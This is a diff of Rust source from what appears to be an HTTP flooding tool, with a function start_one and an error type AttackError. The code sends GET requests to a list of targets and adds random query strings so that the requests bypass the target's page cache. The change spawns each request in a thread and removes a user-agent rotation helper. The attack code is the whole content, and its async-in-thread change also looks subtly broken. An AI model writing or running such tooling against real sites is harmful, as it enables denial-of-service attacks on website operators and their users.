@@ -1,15 +1,12 @@
-use crate::appcfg;
-use crate::target;
+use crate::{target, utils::clear_page_cache};
+use reqwest::{header, Method};
 
 #[derive(Debug)]
 pub enum AttackError {
-    Other(String),
     Request(reqwest::Error),
 }
 
 pub async fn start_one(targets: Vec<target::Target>) -> Result<(), AttackError> {
-    use reqwest::{header, Method};
-
     let ref mut headers = header::HeaderMap::new();
     headers.insert(
         "Accept",
@@ -17,18 +14,20 @@ pub async fn start_one(targets: Vec<target::Target>) -> Result<(), AttackError> 
             "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
         ),
     );
-    let ref req_client = reqwest::ClientBuilder::new()
-        //.user_agent(any_other_user_agent())
-        .default_headers(headers.clone())
-        .build()
-        .map_err(AttackError::Request)?;
-    for t in targets.iter() {
+    for t in targets.into_iter() {
+        let req_client = reqwest::ClientBuilder::new()
+            //.user_agent(any_other_user_agent())
+            .default_headers(headers.clone())
+            .build()
+            .map_err(AttackError::Request)?;
+
         match t.method {
-            Method::GET => match t.url.as_ref().map(url::Url::as_str) {
-                Some(u) => {
-                    let mut u = u.to_string();
-                    u.push_str(&format!("?{}", clear_page_cache()));
-                    req_client.get(u).send().await;
+            Method::GET => match t.url {
+                Some(mut u) => {
+                    u.set_query(Some(&clear_page_cache()));
+                    std::thread::spawn(move || async move {
+                        let _ = req_client.get(u.as_str()).send().await;
+                    });
                     // crate::log(u);
                 }
                 None => {
@@ -42,23 +41,4 @@ pub async fn start_one(targets: Vec<target::Target>) -> Result<(), AttackError> 
     }
 
     Ok(())
-}
-
-fn any_other_user_agent(cfg: &appcfg::AppCfg) -> String {
-    use rand::Rng;
-    let mut rng = rand::thread_rng();
-    let s_agent = rng.gen_range(0, cfg.agents.len());
-
-    if let Some(agent) = cfg.agents.get(s_agent) {
-        return agent.to_string();
-    } else {
-        any_other_user_agent(cfg)
-    }
-}
-
-fn clear_page_cache() -> String {
-    use rand::Rng;
-    let mut rng = rand::thread_rng();
-
-    format!("{}", rng.gen::<u64>())
 }
